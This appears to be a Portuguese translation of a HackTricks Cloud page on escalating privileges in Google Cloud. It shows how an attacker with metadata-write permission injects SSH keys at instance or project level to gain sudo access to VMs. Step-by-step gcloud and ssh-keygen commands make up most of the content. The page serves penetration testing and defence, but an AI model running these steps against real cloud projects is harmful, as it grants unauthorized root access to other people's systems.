# GCP - Adicionar Metadados SSH Personalizados

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Modificando os metadados <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

A modifica√ß√£o de metadados em uma inst√¢ncia pode levar a **riscos significativos de seguran√ßa se um atacante obtiver as permiss√µes necess√°rias**.

### **Incorpora√ß√£o de Chaves SSH nos Metadados Personalizados**

No GCP, **sistemas Linux** frequentemente executam scripts do [Ambiente de H√≥spede Linux Python para Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Um componente cr√≠tico disso √© o [daemon de contas](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), que √© projetado para **verificar regularmente** o endpoint de metadados da inst√¢ncia em busca de **atualiza√ß√µes nas chaves p√∫blicas SSH autorizadas**.

Portanto, se um atacante puder modificar os metadados personalizados, ele poderia fazer com que o daemon encontre uma nova chave p√∫blica, que ser√° processada e **integrada no sistema local**. A chave ser√° adicionada ao arquivo `~/.ssh/authorized_keys` de um **usu√°rio existente ou potencialmente criando um novo usu√°rio com privil√©gios `sudo`**, dependendo do formato da chave. E o atacante poder√° comprometer o host.

### **Adicionar chave SSH a um usu√°rio privilegiado existente**

1. **Examinar Chaves SSH Existente na Inst√¢ncia:**
- Execute o comando para descrever a inst√¢ncia e seus metadados para localizar as chaves SSH existentes. A se√ß√£o relevante na sa√≠da estar√° em `metadata`, especificamente na chave `ssh-keys`.
```bash
gcloud compute instances describe [INST√ÇNCIA] --zone [ZONA]
```
- Preste aten√ß√£o ao formato das chaves SSH: o nome de usu√°rio precede a chave, separado por dois pontos.

2. **Preparar um Arquivo de Texto para Metadados de Chave SSH:**
- Salve os detalhes dos nomes de usu√°rios e suas chaves SSH correspondentes em um arquivo de texto chamado `meta.txt`. Isso √© essencial para preservar as chaves existentes ao adicionar novas.

3. **Gerar uma Nova Chave SSH para o Usu√°rio Alvo (`alice` neste exemplo):**
- Use o comando `ssh-keygen` para gerar uma nova chave SSH, garantindo que o campo de coment√°rio (`-C`) corresponda ao nome de usu√°rio alvo.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Adicione a nova chave p√∫blica ao `meta.txt`, imitando o formato encontrado nos metadados da inst√¢ncia.

4. **Atualizar os Metadados de Chave SSH da Inst√¢ncia:**
- Aplique os metadados de chave SSH atualizados √† inst√¢ncia usando o comando `gcloud compute instances add-metadata`.
```bash
gcloud compute instances add-metadata [INST√ÇNCIA] --metadata-from-file ssh-keys=meta.txt
```

5. **Acessar a Inst√¢ncia Usando a Nova Chave SSH:**
- Conecte-se √† inst√¢ncia com SSH usando a nova chave, acessando o shell no contexto do usu√°rio alvo (`alice` neste exemplo).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **Criar um novo usu√°rio privilegiado e adicionar uma chave SSH**

Se nenhum usu√°rio interessante for encontrado, √© poss√≠vel criar um novo que receber√° privil√©gios `sudo`:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Chaves SSH a n√≠vel de projeto <a href="#sshing-around" id="sshing-around"></a>

√â poss√≠vel ampliar o acesso SSH a v√°rias M√°quinas Virtuais (VMs) em um ambiente de nuvem aplicando **chaves SSH a n√≠vel de projeto**. Esta abordagem permite o acesso SSH a qualquer inst√¢ncia dentro do projeto que n√£o tenha bloqueado explicitamente as chaves SSH em todo o projeto. Aqui est√° um guia resumido:

1. **Aplicar Chaves SSH a N√≠vel de Projeto:**
- Use o comando `gcloud compute project-info add-metadata` para adicionar chaves SSH do arquivo `meta.txt` aos metadados do projeto. Esta a√ß√£o garante que as chaves SSH sejam reconhecidas em todas as VMs do projeto, a menos que uma VM tenha a op√ß√£o "Bloquear chaves SSH em todo o projeto" habilitada.
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **Acessar as Inst√¢ncias Usando Chaves em Todo o Projeto:**
- Com as chaves SSH em todo o projeto configuradas, voc√™ pode acessar as inst√¢ncias dentro do projeto via SSH. As inst√¢ncias que n√£o bloqueiam as chaves em todo o projeto aceitar√£o a chave SSH, concedendo acesso.
- Um m√©todo direto para acessar uma inst√¢ncia √© usando o comando `gcloud compute ssh [INST√ÇNCIA]`. Este comando utiliza seu nome de usu√°rio atual e as chaves SSH definidas no n√≠vel do projeto para tentar o acesso.


# Refer√™ncias
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
